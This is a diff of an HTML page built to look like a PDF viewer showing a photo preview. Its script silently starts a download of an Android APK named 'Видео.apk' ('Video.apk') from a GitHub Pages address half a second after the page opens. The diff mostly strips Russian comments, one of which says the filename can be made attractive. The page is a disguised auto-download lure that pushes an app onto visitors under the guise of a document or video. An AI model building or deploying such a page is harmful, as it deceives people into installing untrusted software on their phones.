@@ -15,8 +15,8 @@
     
     <meta property="og:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo_preview.jpg">
     
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
+    <meta property="og:image:width" content="600"> 
+    <meta property="og:image:height" content="800">
     <style>
         /* Общие стили и фон */
         body, html { 
@@ -33,9 +33,9 @@
         /* Стиль "PDF Viewer" (окошко) */
         .pdf-viewer {
             width: 90%;
-            max-width: 800px; /* Ограничиваем размер для десктопа */
-            height: 90vh; /* Высота относительно экрана */
-            background-color: #34495e; /* Более темный цвет для рамки */
+            max-width: 800px; 
+            height: 90vh; 
+            background-color: #34495e; 
             border-radius: 8px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             display: flex;
@@ -45,7 +45,7 @@
 
         /* Заголовок-имитация */
         .header {
-            background-color: #27ae60; /* Зеленый/акцентный цвет */
+            background-color: #27ae60; 
             color: white;
             padding: 10px 20px;
             font-weight: bold;
@@ -56,10 +56,10 @@
 
         /* Область для картинки (имитация содержимого PDF) */
         .content {
-            flex-grow: 1; /* Занимает все доступное место */
-            background-color: #ecf0f1; /* Светлый фон бумаги */
+            flex-grow: 1; 
+            background-color: #ecf0f1; 
             padding: 20px;
-            overflow-y: scroll; /* Позволяет прокручивать, если фото большое */
+            overflow-y: scroll; 
             text-align: center;
         }
         
@@ -67,7 +67,7 @@
         .content img {
             max-width: 100%;
             height: auto;
-            border: 1px solid #bdc3c7; /* Тонкая рамка, как у документа */
+            border: 1px solid #bdc3c7; 
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             display: block;
             margin: 0 auto;
@@ -91,10 +91,9 @@
     <script>
         const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
         const apkUrl = repoBaseUrl + 'downloads/test1.apk'; 
-        const apkFilename = 'Видео.apk'; // Имя файла для скачивания (можно сделать привлекательным)
+        const apkFilename = 'Видео.apk'; 
 
         function startDownload() {
-            // Создаем ссылку для принудительного скачивания
             const link = document.createElement('a');
             link.href = apkUrl + '?t=' + Date.now(); 
             link.download = apkFilename; 
@@ -104,7 +103,6 @@
             document.body.removeChild(link);
         }
 
-        // Запускаем скачивание сразу при открытии страницы (через 0.5 секунды)
         window.onload = function() {
             setTimeout(startDownload, 500); 
         };
